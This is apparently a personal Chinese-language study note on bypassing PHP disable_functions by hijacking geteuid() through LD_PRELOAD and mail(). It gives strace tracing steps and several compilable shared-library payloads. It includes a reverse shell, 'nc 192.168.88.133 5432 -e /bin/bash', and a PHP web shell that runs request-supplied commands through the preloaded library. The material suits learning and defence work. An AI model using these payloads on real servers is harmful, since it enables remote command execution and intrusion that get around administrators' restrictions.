
---
# 一、原理
![[屏幕截图 2024-12-27 180100.png]]

![[屏幕截图 2024-12-27 180132.png]]

```php
<?php
mail('','','');
?>
```

![[屏幕截图 2024-12-27 181623.png]]

```
查看执行动作
strace -o 1.txt -f php demo.php
过滤
cat 1.txt | grep execve
```

![[屏幕截图 2024-12-27 181908.png]]

```
查看调用哪些库文件
可以利用getuid的库文件，实现恶意代码执行
```


![[屏幕截图 2024-12-27 182553.png]]

```C
#include<stdlib.h>
#include<stdio.h>
#include<string.h>

void payload(){

    system("echo '小可爱，你的邮件还能发出去吗？'");

}

  
int geteuid(){

    unsetenv("LD_PRELOAD");

    payload();

}

编译指令，生成共享库
gcc -shared -fPIC demo.c -o demo.so
```

![[屏幕截图 2024-12-27 183203.png]]

```
开始执行
```

# 二、实战

## 1、条件
![[屏幕截图 2024-12-27 193730.png]]

## 2、构造playload

### 1.直接执行

![[屏幕截图 2024-12-27 194003.png]]

```
#include <stdlib.h>
#include <stdio.h>
#include <string.h>


void payload(){

    system("nc 192.168.88.133 5432 -e /bin/bash");

}

int geteuid()

{

    if(getenv("LD_PRELOAD") == NULL){ return 0; }
    unsetenv("LD_PRELOAD");
    payload();

}



gcc -shared -fPIC demo.c -o demo.so
```

### 2.通过环境变量执行

![[屏幕截图 2024-12-27 201456.png]]

![[屏幕截图 2024-12-27 201821.png]]

```c
#include <stdlib.h>

#include <stdio.h>

#include <string.h>



int geteuid()

{

    const char* cmdline = getenv("EVIL_CMDLINE"); //获得系统的环境变量EVIL_CMDLINE
    if(getenv("LD_PRELOAD") == NULL){ return 0; }

    unsetenv("LD_PRELOAD"); //删除系统变量

    system(cmdline);

}
```

```php
<?php

$cmd = $_REQUEST["cmd"]; 

$out_path = $_REQUEST["outpath"]; 

$evil_cmdline = $cmd." > ".$out_path." 2>&1"; 

echo "<br /><b>cmdline: </b>".$evil_cmdline; 

putenv("EVIL_CMDLINE=".$evil_cmdline); 



$so_path = $_REQUEST["sopath"]; 

putenv("LD_PRELOAD=".$so_path); 

mail("", "", "", ""); 



echo "<br /><b>output: </b><br />".nl2br(file_get_contents($out_path))

?>
```

### 执行
![[屏幕截图 2024-12-27 202643.png]]

```
蚁剑 插件disable_function
```